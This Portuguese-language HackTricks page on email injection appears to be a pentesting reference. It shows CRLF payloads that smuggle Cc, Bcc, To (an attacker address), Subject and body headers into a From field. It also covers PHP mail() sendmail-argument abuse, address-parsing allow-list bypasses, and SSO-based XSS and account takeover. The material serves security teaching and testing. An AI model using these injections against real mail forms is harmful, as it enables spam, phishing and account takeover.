# Email Injections

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas** da comunidade **mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## Inject in sent e-mail

### Inject Cc and Bcc after sender argument
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
A mensagem ser√° enviada para as contas recipient e recipient1.

### Inject argument
```
From:sender@domain.com%0ATo:attacker@domain.com
```
A mensagem ser√° enviada ao destinat√°rio original e √† conta do atacante.

### Inject Subject argument
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
O assunto falso ser√° adicionado ao assunto original e, em alguns casos, o substituir√°. Isso depende do comportamento do servi√ßo de e-mail.

### Mudar o corpo da mensagem

Injete uma quebra de linha dupla e, em seguida, escreva sua mensagem para alterar o corpo da mensagem.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Explora√ß√£o da fun√ß√£o mail() do PHP
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### O 5¬∫ par√¢metro ($additional\_parameters)

Esta se√ß√£o ser√° baseada em **como abusar deste par√¢metro supondo que um atacante o controla**.

Este par√¢metro ser√° adicionado √† linha de comando que o PHP usar√° para invocar o bin√°rio sendmail. No entanto, ele ser√° sanitizado com a fun√ß√£o `escapeshellcmd($additional_parameters)`.

Um atacante pode **injetar par√¢metros adicionais para sendmail** neste caso.

#### Diferen√ßas na implementa√ß√£o do /usr/sbin/sendmail

A interface do **sendmail** √© **fornecida pelo software de e-mail MTA** (Sendmail, Postfix, Exim etc.) instalado no sistema. Embora a **funcionalidade b√°sica** (como os par√¢metros -t -i -f) permane√ßa a **mesma** por raz√µes de compatibilidade, **outras fun√ß√µes e par√¢metros** variam muito dependendo do MTA instalado.

Aqui est√£o alguns exemplos de diferentes p√°ginas de manual do comando/interface sendmail:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

Dependendo da **origem do bin√°rio sendmail**, diferentes op√ß√µes foram descobertas para abusar delas e **vazar arquivos ou at√© mesmo executar comandos arbitr√°rios**. Confira como em [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Injetar no nome do e-mail

### Partes ignoradas de um e-mail

Os s√≠mbolos: **+, -** e **{}** em raras ocasi√µes podem ser usados para marca√ß√£o e ignorados pela maioria dos servidores de e-mail.

* Ex. john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Coment√°rios entre par√™nteses ()** no in√≠cio ou no final tamb√©m ser√£o ignorados.

* Ex. john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Bypass de lista de permiss√µes

<figure><img src="../.gitbook/assets/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Cita√ß√µes

<figure><img src="../.gitbook/assets/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPs

Voc√™ tamb√©m pode usar IPs como nomes de dom√≠nio entre colchetes:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### Outras vulnerabilidades

![https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](<../.gitbook/assets/image (1131).png>)

## SSO de terceiros

### XSS

Alguns servi√ßos como **github** ou **salesforce permitem** que voc√™ crie um **endere√ßo de e-mail com cargas √∫teis de XSS nele**. Se voc√™ puder **usar esses provedores para fazer login em outros servi√ßos** e esses servi√ßos **n√£o estiverem sanitizando** corretamente o e-mail, voc√™ poderia causar **XSS**.

### Tomada de conta

Se um **servi√ßo SSO** permitir que voc√™ **crie uma conta sem verificar o endere√ßo de e-mail fornecido** (como **salesforce**) e depois voc√™ puder usar essa conta para **fazer login em um servi√ßo diferente** que **confia** na salesforce, voc√™ poderia acessar qualquer conta.\
_Observe que a salesforce indica se o e-mail fornecido foi ou n√£o verificado, mas a aplica√ß√£o deve levar em conta essa informa√ß√£o._

## Responder a

Voc√™ pode enviar um e-mail usando _**From: company.com**_ e _**Replay-To: attacker.com**_ e se qualquer **resposta autom√°tica** for enviada devido ao e-mail ter sido enviado **de** um **endere√ßo interno**, o **atacante** pode ser capaz de **receber** essa **resposta**.

## Taxa de Hard Bounce

Certos servi√ßos, como AWS, implementam um limite conhecido como **Taxa de Hard Bounce**, tipicamente definida em 10%. Esta √© uma m√©trica cr√≠tica, especialmente para servi√ßos de entrega de e-mail. Quando essa taxa √© excedida, o servi√ßo, como o servi√ßo de e-mail da AWS, pode ser suspenso ou bloqueado.

Um **hard bounce** refere-se a um **e-mail** que foi devolvido ao remetente porque o endere√ßo do destinat√°rio √© inv√°lido ou inexistente. Isso pode ocorrer por v√°rias raz√µes, como o **e-mail** sendo enviado para um endere√ßo inexistente, um dom√≠nio que n√£o √© real, ou a recusa do servidor do destinat√°rio em aceitar **e-mails**.

No contexto da AWS, se voc√™ enviar 1000 e-mails e 100 deles resultarem em hard bounces (devido a raz√µes como endere√ßos ou dom√≠nios inv√°lidos), isso significaria uma taxa de hard bounce de 10%. Atingir ou exceder essa taxa pode fazer com que o AWS SES (Simple Email Service) bloqueie ou suspenda suas capacidades de envio de e-mail.

√â crucial manter uma baixa taxa de hard bounce para garantir um servi√ßo de e-mail ininterrupto e manter a reputa√ß√£o do remetente. Monitorar e gerenciar a qualidade dos endere√ßos de e-mail em suas listas de mala direta pode ajudar significativamente a alcan√ßar isso.

Para informa√ß√µes mais detalhadas, a documenta√ß√£o oficial da AWS sobre como lidar com bounces e reclama√ß√µes pode ser consultada em [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## Refer√™ncias

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas** da comunidade **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}
